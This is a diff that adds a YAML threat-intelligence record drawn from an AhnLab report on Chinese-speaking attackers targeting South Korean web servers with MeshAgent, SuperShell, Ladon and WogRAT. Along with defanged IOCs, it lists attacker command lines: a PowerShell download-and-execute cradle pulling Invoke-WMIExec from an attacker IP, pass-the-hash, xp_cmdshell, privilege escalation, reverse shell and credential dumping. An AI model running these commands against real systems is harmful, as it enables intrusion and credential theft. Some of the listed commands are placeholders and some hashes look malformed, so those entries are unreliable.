@@ -1,0 +1,72 @@
+description: Attacks targeting South Korean web servers using MeshAgent and SuperShell,
+  with ELF-based malware distribution.
+attribution: Chinese-speaking attackers
+malware_families:
+- WogRAT
+- Ladon
+- PowerLadon
+- SuperShell
+- MeshAgent
+TTPs:
+  processes:
+  - w3wp.exe
+  - Fscan.exe
+  - Ladon.exe
+  - PowerLadon.ps1
+  - SuperShell.exe
+  - MeshAgent.exe
+  - Network Password Dump.exe
+  - WMIExec.exe
+  commandline:
+  - w3wp.exe /K
+  - Fscan.exe -a
+  - fscan.exe  -hf i.txt -nocolor -silent -o rr8.txt
+  - fscan.exe  -hf a.txt -nocolor -silent -p 445,135,22 -o rr6.txt
+  - Ladon.exe privilege_escalation_command
+  - PowerLadon.ps1 -command SweetPotato
+  - SuperShell.exe -reverse_shell
+  - MeshAgent.exe -connect C&C_server_address
+  - Network Password Dump.exe -dump_credentials
+  - WMIExec.exe -admin_hash NT_hash
+  powershell:
+  - powershell  -exec bypass Import-Module .\Ladon.ps1;Ladon SweetPotato whoami
+  - powershell  -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon Runas [User] [Password] whoami
+  - powershell  -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon MssqlCmd [IP] [User] [Password] master xp_cmdshell “net user
+  - IEX (New-Object Net.WebClient).DownloadString(‘hxxp://139.180.142[.]127/Invoke-WMIExec.ps1’);Invoke-WMIExec -Target [IP] -Domain [Domain] -Username Administrator -Hash [Hash] -Command ‘whoami’ -verbose
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  file_activity:
+  - /path/to/Chopper.asp
+  - /path/to/Godzilla.aspx
+  - /path/to/ReGe-ORG.asp
+  - /path/to/Fscan.exe
+  - /path/to/Ladon.exe
+  - /path/to/PowerLadon.ps1
+  - /path/to/SuperShell.exe
+  - /path/to/MeshAgent.exe
+  - /path/to/WogRAT.exe
+  - /path/to/Network Password Dump.exe
+  persistence:
+  - Web shells installed in ASP and ASPX formats
+  network_connections:
+  - process: SuperShell.exe
+    destination_address: C&C_server_address
+    port: 443
+IOCs:
+- 108[.]61[.]247[.]121
+- 66[.]42[.]113[.]183
+- http[:]//139[.]180[.]142[.]127/Invoke-WMIExec[.]ps1
+- http[:]//45[.]76[.]219[.]39/bb
+- http[:]//45[.]76[.]219[.]39/mc[.]exe
+- http[:]//66[.]42[.]113[.]183/acccc
+- http[:]//66[.]42[.]113[.]183/kblockd
+- 06ebef1f7cc6fb21f8266f8c9f9ae2d9
+- 03f6211234c0889142414f7b579d43c38
+- 0460953e5f7d1e490207d37f95c4f430a
+- 04c8ccdc6f1838489ed2ebeb4978220cb
+- 05c835258fc39104f198bca243e730d57
+authors:
+- AhnLabTIP
+reference: https://asec.ahnlab.com/en/88627/
+date_of_publication: June 23, 2025
+file_creation_date: June 30, 2025
